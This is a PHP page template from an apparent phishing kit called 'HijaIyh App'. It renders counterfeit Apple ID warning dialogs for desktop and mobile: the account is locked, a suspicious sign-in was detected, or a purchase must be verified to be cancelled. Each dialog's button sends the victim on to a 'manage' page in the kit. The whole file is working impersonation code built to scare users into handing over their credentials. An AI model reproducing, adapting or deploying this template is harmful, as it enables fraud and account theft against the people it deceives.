<?php 
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/
require_once(dirname(dirname(__DIR__)).'/autoloader.php');
$appidkey=sha1($_SERVER['HTTP_USER_AGENT']);
$case = $core->parse_hijaiyh('sp','case');
$s=[];
if($case == 'locked'){

$s['title'] = $core->translate('This Apple ID has been locked for security reasons.',$lang);
$s['description'] = $core->translate('You must unlock your account before signing in.',$lang);
$s['button'] = $core->translate('Unlock Account',$lang);
$s['ccl'] = $core->translate('Cancel',$lang);

}elseif($case == 'invoice')
{

$s['title'] = $core->translate('Are you sure to cancel this purchase?',$lang);
$s['description'] = $core->translate('To cancel this transaction, you must verify your account.',$lang);
$s['button'] = $core->translate('Cancel Now',$lang);
$s['ccl'] = $core->translate('Cancel',$lang);

}elseif($case == 'verify')
{

$s['title'] = $core->translate('We has detected an unauthorized sign in to your Apple ID.',$lang);
$s['description'] = $core->translate('To secure your Apple ID, you must verify your account.',$lang);
$s['button'] = $core->translate('Verify Account',$lang);
$s['ccl'] = $core->translate('Cancel',$lang);

}elseif($case == 'myself')
{

$s['title'] = $core->translate($core->parse_hijaiyh('case','title'),$lang);
$s['description'] = $core->translate($core->parse_hijaiyh('case','description'),$lang);
$s['button'] = $core->translate($core->parse_hijaiyh('case','button'),$lang);
$s['ccl'] = $core->translate('Cancel');

}

if($_GET['mode'] =='desktop'){
	?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="./HijaIyh_App/assets/css/login.css" media="screen" rel="stylesheet" type="text/css">
<style type="text/css">

</style>
<title></title>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container restrict-max-wh" data-mode="embed">
<div class="dialog" style="background: rgba(255, 255, 255, 0.85); position:absolute; left:250px;top:-390px;border-radius: 0px; border: none; max-width: 500px; height: 300px;">
<div class="app-dialog">
<div class="head">
<div class="title" title-align="center">
<h2 style="font-weight: 600;line-height: 1.39375; font-size: 29px; margin: 5px 20px; font-family: sans-serif,initial; letter-spacing: 0.011em; color: #494949;"> <?=$s['title'];?></h2>
</div>
</div>
<div body-align="center">
<div class="acc-locked" id="acc-locked">
<div class="dialog-body">
<div class="dialog-info">
<div class="thin" style="font-weight: 350; color: #494949; line-height: 1.6; letter-spacing: 0.011em;"><?=$s['description'];?></div><br>
<a href="?page=<?=$core->mobile_link('manage');?>&appIdKey=<?=$appidkey;?>&locale=<?=$localex;?>" class="button rect" style="padding:5px;padding-left:15px;padding-right:15px;color:#fff;text-decoration:none" id="xbuttonn"><?=$s['button'];?></a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>

<?php
}elseif($_GET['mode'] == 'mobile')
{
	?>

<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
<link href="./HijaIyh_App/assets/css/login.css" media="screen" rel="stylesheet" type="text/css">
<style type="text/css">

</style>
<title></title>
</head>
<body>
<div class="si-body si-container container-fluid" data-theme="lite" id="content">
<div class="widget-container restrict-max-wh" data-mode="embed">
<div class="dialog" style="background: rgba(255, 255, 255, 0.85); position:absolute; top:-270px;border-radius: 0px; border: none; max-width: 555px; max-height: 350px;">
<div class="app-dialog">
<div class="head">
<div class="title" title-align="center">
<h2 style="font-weight: 600;line-height: 1.29375; font-size: 27px; margin: 5px 5px;margin-top:10px; font-family: sans-serif,initial; letter-spacing: 0.011em; color: #494949; font-heigth"> <?php echo $s['title'];?></h2>
</div>
</div>
<div body-align="center">
<div class="acc-locked" id="acc-locked">
<div class="dialog-body">
<div class="dialog-info">
<div class="thin" style="font-weight: 450; color: #494949; line-height: 2.0; letter-spacing: 0.021em;"><?php echo $s['description'];?></div><br>
<a href="?page=m.manage&appIdKey=<?=$appidkey;?>&locale=<?=$localex;?>" class="button rect" style="padding:5px;padding-left:15px;padding-right:15px;color:#fff;text-decoration:none" id="xbuttonn"><?php echo $s['button'];?></a>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>

	<?php
}